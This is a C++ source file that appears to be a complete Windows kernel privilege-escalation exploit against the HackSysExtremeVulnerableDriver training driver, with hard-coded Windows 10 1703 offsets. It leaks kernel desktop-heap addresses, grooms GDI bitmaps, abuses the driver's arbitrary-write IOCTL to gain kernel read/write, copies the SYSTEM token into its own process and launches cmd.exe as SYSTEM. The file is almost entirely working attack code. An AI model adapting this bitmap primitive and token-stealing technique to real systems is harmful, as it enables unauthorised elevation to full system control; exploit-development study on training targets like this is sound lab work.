#include<windows.h>
#include<cstdio>
#include<psapi.h>
LRESULT CALLBACK WNDProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

HANDLE hDevide;
HBITMAP ManagerHandle;
HBITMAP WorkHandle;
//win10 1703 offset
ULONG64 UniqueProcessIdOffset = 0x2e0;
ULONG64 TokenOffset = 0x358;
ULONG64 ActiveProcessLinks = 0x2e8;

static VOID
xxCreateCmdLineProcess(VOID) {
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi); // 创建cmd子进程
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}
BOOL init() {
	hDevide = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		NULL,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);
	if (hDevide == INVALID_HANDLE_VALUE) {
		printf("Create Device Fail:0x%X\n", GetLastError());
		return FALSE;
	}
	else
		return TRUE;
}

void BitmapRead(PULONG64 addr, PULONG64 result) {
	SetBitmapBits(ManagerHandle, 8, &addr);
	GetBitmapBits(WorkHandle, 8, result);
}
void BitmapWrite(PULONG64 addr, ULONG64 value) {
	SetBitmapBits(ManagerHandle, 8, &addr);
	SetBitmapBits(WorkHandle, 8, &value);
}

void GetSystemEprocess(PULONGLONG systemEprocess) {
	LPVOID drivers[1024];
	DWORD cbNeeded;
	PVOID ntoskrnlBase;
	int cDrivers, i;

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
	{
		ntoskrnlBase = drivers[0];
	}
	else
	{
		printf("EnumDeviceDrivers failed; array size needed is %d\n", cbNeeded / sizeof(LPVOID));
		return;
	}

	HMODULE hLoaded = LoadLibraryA("ntoskrnl.exe");
	if (!hLoaded) {
		printf("Load ntoskrnl.exe error\n");
		return;
	}
	PVOID addr = GetProcAddress(hLoaded, "PsInitialSystemProcess");
	if (!addr) {
		printf("Get PsInitialSystemProcess error\n");
		return;
	}
	ULONGLONG offset = (ULONGLONG)addr - (ULONGLONG)hLoaded;
	BitmapRead((PULONG64)(offset + (ULONGLONG)ntoskrnlBase), (PULONG64)systemEprocess);
	if (!*systemEprocess) {
		printf("Read system EPROCESS error\n");
		return;
	}
}
ULONG64 TEB_Win32ClientInfo = 0;
ULONG64 TEB_UserKernelDesktopHeap = 0;
ULONG64 TEB_KernelDesktopHeap = 0;
ULONG64 ulClientDelta = 0;

ULONG64 offset_tagCLS = 0xa8;
ULONG64 offset_lpszMenuName = 0x90;

ULONG64 UsertagWND = 0;
ULONG64 KerneltagCLS = 0;
void LeakDesktopHeap() {
	ULONG64 TEB = 0;
	__asm {
		mov rax, gs: [0x30]
		mov TEB, rax
	}
	TEB_Win32ClientInfo = TEB + 0x800;
	TEB_UserKernelDesktopHeap = *(PULONG64)(TEB + 0x828);//000000c1`eee89820  0000024d`f7f20700 fffff6b3`488e0000-----I don't know why on win7x64
	//TEB_UserKernelDesktopHeap = *(PULONG64)(TEB + 0x820) & 0xfffffffffffff000;
	TEB_KernelDesktopHeap = *(PULONG64)(TEB_UserKernelDesktopHeap + 0x28);
	ulClientDelta = TEB_KernelDesktopHeap - TEB_UserKernelDesktopHeap;
	printf("[+] _TEB.Win32ClientInfo:%p\n", TEB_Win32ClientInfo);
	printf("[+] User Mapped Desktop Heap:%p\n", TEB_UserKernelDesktopHeap);
	printf("[+] Kernel Desktop Heap:%p\n", TEB_KernelDesktopHeap);
	printf("[+] ulClientDelta:%p\n", ulClientDelta);
}

ULONG64 ParseUserDesktopHeap_byTEB(HWND hWindow) {
	LeakDesktopHeap();
	for (int i = 0; i < 0xfffff; i+=8) {
		ULONG64 handleFinder = TEB_UserKernelDesktopHeap + i;
		if ((ULONG64)hWindow == *(PULONG64)(handleFinder)) {
			UsertagWND = TEB_UserKernelDesktopHeap + i;
			KerneltagCLS = *(PULONG64)(UsertagWND + offset_tagCLS);
			break;
		}
	}
	ULONG64 lpszMenuName = *(PULONG64)(KerneltagCLS - ulClientDelta + offset_lpszMenuName);
	printf("[+] User tagWND:%p\n", UsertagWND);
	printf("[+] User tagCLS:%p\n", KerneltagCLS - ulClientDelta);
	printf("[+] Kernel tagWND:%p\n", UsertagWND + ulClientDelta);
	printf("[+] Kernel tagCLS:%p\n", KerneltagCLS);
	printf("[+] Kernel tagCLS.lpszMenuName:%p\n", lpszMenuName);
	return lpszMenuName;
}
ULONG64 GetHMValidateHandle() {
	HMODULE huser32 = LoadLibraryA("user32.dll");
	if (!huser32) {
		printf("Load user32dll error\n");
		return 0;
	}
	ULONG64 IsMenu = (ULONG64)GetProcAddress(huser32, "IsMenu");
	ULONG64 HMValidateHandle = 0;
	for (int i = 0; i < 0x10; i++) {
		if (*(PBYTE)(IsMenu + i) == 0xe8) {
			HMValidateHandle = IsMenu + i + 5;
			for (int j = 0; *(PBYTE)(IsMenu + i + 1 + j); j++) {
				HMValidateHandle += (*(PBYTE)(IsMenu + i + 1 + j)) << (8*j);
			}
			break;
		}
	}
	return HMValidateHandle;
}
ULONG64 ParseUserDesktopHeap_byHMValidateHandle(HWND hWindow) {
	typedef ULONG64(__stdcall* PHMValidateHandle)(HWND, BYTE);//second parameter for pass
	PHMValidateHandle HMValidateHandle = (PHMValidateHandle)GetHMValidateHandle();
	printf("[+] Function-HMValidateHandle:%p\n", HMValidateHandle);
	ULONG64 UsertagWND = HMValidateHandle(hWindow, 1);
	if (!UsertagWND) {
		printf("HMValidateHandle Fail:0x%X\n", GetLastError());
		return 1;
	}
	KerneltagCLS = *(PULONG64)(UsertagWND + offset_tagCLS);
	printf("[+] UsertagWND:%p\n", UsertagWND);
	ULONG64  lpszMenuName = *(PULONG64)(KerneltagCLS - ulClientDelta + offset_lpszMenuName);
	printf("[+] User tagWND:%p\n", UsertagWND);
	printf("[+] User tagCLS:%p\n", KerneltagCLS - ulClientDelta);
	printf("[+] Kernel tagWND:%p\n", UsertagWND + ulClientDelta);
	printf("[+] Kernel tagCLS:%p\n", KerneltagCLS);
	printf("[+] Kernel tagCLS.lpszMenuName:%p\n", lpszMenuName);
	return lpszMenuName;
}

HBITMAP LeakBitmap(PULONG64 PMenuNameKernel) {
	char MenuName[0x1000] = { 0 };
	memset(MenuName, 'A', 0x8F0);
	WNDCLASSA WNDClass = { 0 };
	WNDClass.lpfnWndProc = (WNDPROC)WNDProc;
	WNDClass.hInstance = GetModuleHandle(NULL);
	WNDClass.lpszClassName = "cchh";
	WNDClass.lpszMenuName = MenuName;
	while (1) {
		//-----------------------pre----------------------------
		RegisterClassA(&WNDClass);
		//hWindow = CreateWindowA(WNDClass.lpszClassName, "cchh", WS_OVERLAPPEDWINDOW | WS_VISIBLE, 0, 0, 250, 250, 0, 0, WNDClass.hInstance, 0);
		HWND hWindowPre = CreateWindowExA(0, WNDClass.lpszClassName, "cchh", WS_OVERLAPPEDWINDOW | WS_VISIBLE, 0, 0, 250, 250, 0, 0, WNDClass.hInstance, 0);
		if (!hWindowPre) {
			printf("Create Window Fail:0x%X\n", GetLastError());
			return 0;
		}
		printf("[+] Pre window handle:%p\n", hWindowPre);
		ULONG64 MenuNameKernelPre = ParseUserDesktopHeap_byTEB(hWindowPre);
		//ULONG64 MenuNamePre = ParseUserDesktopHeap_byHMValidateHandle(hWindow); two ways to leak menu address in kernel
		BOOL result = DestroyWindow(hWindowPre);
		UnregisterClassA(WNDClass.lpszClassName, 0);
		if (!result) {
			printf("Destroy Window Fail:0x%X\n", GetLastError());
			return 0;
		}
		//-----------------------------------------------------
		RegisterClassA(&WNDClass);
		//hWindow = CreateWindowA(WNDClass.lpszClassName, "cchh", WS_OVERLAPPEDWINDOW | WS_VISIBLE, 0, 0, 250, 250, 0, 0, WNDClass.hInstance, 0);
		HWND hWindow = CreateWindowExA(0, WNDClass.lpszClassName, "cchh", WS_OVERLAPPEDWINDOW | WS_VISIBLE, 0, 0, 250, 250, 0, 0, WNDClass.hInstance, 0);
		if (!hWindow) {
			printf("Create Window Fail:0x%X\n", GetLastError());
			return 0;
		}
		printf("[+] window handle:%p\n", hWindow);
		*PMenuNameKernel = ParseUserDesktopHeap_byTEB(hWindow);
		//ULONG64 MenuNamePre = ParseUserDesktopHeap_byHMValidateHandle(hWindow); two ways to leak menu address in kernel
		result = DestroyWindow(hWindow);
		UnregisterClassA(WNDClass.lpszClassName, 0);
		if (!result) {
			printf("Destroy Window Fail:0x%X\n", GetLastError());
			return 0;
		}
		if (MenuNameKernelPre == *PMenuNameKernel) {
			LPVOID buffer = VirtualAlloc(0, 0x50 * 2 * 4, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			memset(buffer, 's', 4);
			HBITMAP bitmap = CreateBitmap(0x701, 2, 1, 8, buffer);
			return bitmap;
		}
	}
}


int main() {
	ULONG64 ManaBase = 0;
	ManagerHandle = LeakBitmap(&ManaBase);
	if (!ManaBase) {
		printf("Leak error\n");
		return 1;
	}
	PULONG64 ManapvScan0 = (PULONG64)(ManaBase + 0x50);

	ULONG64 WorkBase = 0;
	WorkHandle = LeakBitmap(&WorkBase);
	if (!WorkBase) {
		printf("Leak error\n");
		return 1;
	}
	PULONG64 WorkpvScan0 = (PULONG64)(WorkBase + 0x50);
	printf("[+] Manager Bitmap :%p\n", ManaBase);



	printf("Everything is already. Let's fuck\n");

	DWORD CurrentPID = GetCurrentProcessId();
	printf("[+]Pid:%d\n", CurrentPID);

	if (!init())
		exit(1);
	struct {
		PULONG64 what;
		PULONG64 where;
	}UserWriteWhatWhere = { (PULONG64)&WorkpvScan0, ManapvScan0 };
	DWORD recvBuf;
	DeviceIoControl(hDevide, 0x22200B, &UserWriteWhatWhere, sizeof(UserWriteWhatWhere), NULL, 0, &recvBuf, NULL);

	ULONGLONG systemEprocess = 0;
	GetSystemEprocess(&systemEprocess);
	printf("[+]System EPROCESS:%p\n", systemEprocess);
	ULONG64 SystemToken = 0;
	BitmapRead((PULONG64)(systemEprocess + TokenOffset), &SystemToken);

	ULONG64 Eprocess = systemEprocess;
	ULONG64 PID = 0;
	ULONG64 CurrentToken = 0;
	do {
		BitmapRead((PULONG64)(Eprocess + ActiveProcessLinks), &Eprocess);
		Eprocess -= ActiveProcessLinks;
		BitmapRead((PULONG64)(Eprocess + UniqueProcessIdOffset), &PID);
		BitmapRead((PULONG64)(Eprocess + TokenOffset), &CurrentToken);
		//printf("[+]PID:%lld.Token:%p\n",PID,CurrentToken);
	} while (PID != CurrentPID);
	printf("[+]Current EPROCESS:%p\n", Eprocess);
	BitmapWrite((PULONG64)(Eprocess + TokenOffset), SystemToken);
	system("pause");
	__debugbreak();
	xxCreateCmdLineProcess();

	return 0;
}